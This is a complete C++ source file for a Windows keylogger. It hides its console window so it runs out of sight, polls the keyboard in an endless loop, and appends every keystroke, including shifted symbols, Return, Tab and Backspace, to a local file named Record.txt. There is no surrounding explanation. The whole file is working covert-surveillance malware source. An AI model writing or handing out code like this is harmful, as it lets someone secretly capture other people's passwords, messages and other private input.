#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>

using namespace std;

void HideWindow();
void RecordKeystrokes();

int main() {
    HideWindow();
    RecordKeystrokes();
    return 0;
}

void RecordKeystrokes() {
    char keyCode;
    for(;;) {
        for(keyCode=8; keyCode<=222; keyCode++) {
            if(GetAsyncKeyState(keyCode) == -32767) {
                ofstream logFile("Record.txt", ios::app);
                if(((keyCode>64) && (keyCode<91)) && !(GetAsyncKeyState(0x10))) {
                    keyCode += 32;
                    logFile << keyCode;
                    logFile.close();
                    break;
                } else if((keyCode>64) && (keyCode<91)) {
                    logFile << keyCode;
                    logFile.close();
                    break;
                } else {
                    switch(keyCode) {
                        case 48: {
                            if(GetAsyncKeyState(0x10))
                                logFile << ")";
                            else
                                logFile << "0";
                        } break;
                        case 49: {
                            if(GetAsyncKeyState(0x10))
                                logFile << "!";
                            else
                                logFile << "1";
                        } break;
                        case 50: {
                            if(GetAsyncKeyState(0x10))
                                logFile << "@";
                            else
                                logFile << "2";
                        } break;
                        case 51: {
                            if(GetAsyncKeyState(0x10))
                                logFile << "#";
                            else
                                logFile << "3";
                        } break;
                        case 52: {
                            if(GetAsyncKeyState(0x10))
                                logFile << "$";
                            else
                                logFile << "4";
                        } break;
                        case 53: {
                            if(GetAsyncKeyState(0x10))
                                logFile << "%";
                            else
                                logFile << "5";
                        } break;
                        case 54: {
                            if(GetAsyncKeyState(0x10))
                                logFile << "^";
                            else
                                logFile << "6";
                        } break;
                        case 55: {
                            if(GetAsyncKeyState(0x10))
                                logFile << "&";
                            else
                                logFile << "7";
                        } break;
                        case 56: {
                            if(GetAsyncKeyState(0x10))
                                logFile << "*";
                            else
                                logFile << "8";
                        } break;
                        case 57: {
                            if(GetAsyncKeyState(0x10))
                                logFile << "(";
                            else
                                logFile << "9";
                        } break;
                        case VK_SPACE:
                            logFile << " ";
                            break;
                        case VK_RETURN:
                            logFile << "[RETURN]";
                            break;
                        case VK_TAB:
                            logFile << "[TAB]";
                        break;
                        case VK_BACK:
                            logFile << "[BACKSPACE]";
                            break;
                        case VK_DELETE:
                            logFile << "[Del]";
                            break;
                        default:
                            logFile << keyCode;
                    }
                }
            }
        }
    }
}

void HideWindow() {
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
}
